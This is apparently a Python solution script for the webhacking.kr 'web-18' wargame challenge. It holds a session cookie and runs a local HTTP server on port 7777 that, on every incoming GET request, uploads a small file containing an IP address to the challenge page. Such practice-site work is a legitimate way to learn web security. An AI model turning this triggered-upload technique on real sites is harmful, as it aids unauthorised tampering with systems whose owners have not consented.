import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

# Configuration
URL = "https://webhacking.kr/challenge/web-18/"
SESSION_ID = "1"
cookies = {'PHPSESSID': SESSION_ID}

# Function to upload the file
def upload_file():
    filename = "aksd"  # Fixed filename for the upload
    data = '37.60.42.105'  # Content you want to upload

    # Prepare the files for upload
    files = {
        'upfile': (filename, data, 'text/plain')  # Specify the MIME type
    }

    try:
        response = requests.post(URL, cookies=cookies, files=files)  # Using files for upload
        print(f"Uploaded {filename}: {response.status_code}, Response: {response.text}")
        if response.status_code != 200:
            print("Upload failed.")
    except Exception as e:
        print(f"An error occurred: {e}")

# HTTP Server Handler
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Call the upload function when a GET request is received
        print("Received a GET request, initiating file upload...")
        upload_file()  # Trigger the upload
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Upload initiated.")

# Run HTTP Server in a Thread
def run_http_server():
    server_address = ('', 7777)  # Listen on port 7777
    httpd = HTTPServer(server_address, RequestHandler)
    print('Starting server on port 7777...')
    httpd.serve_forever()

# Start the HTTP server in a separate thread
http_thread = threading.Thread(target=run_http_server)
http_thread.start()

# Server will keep running and respond to incoming requests.
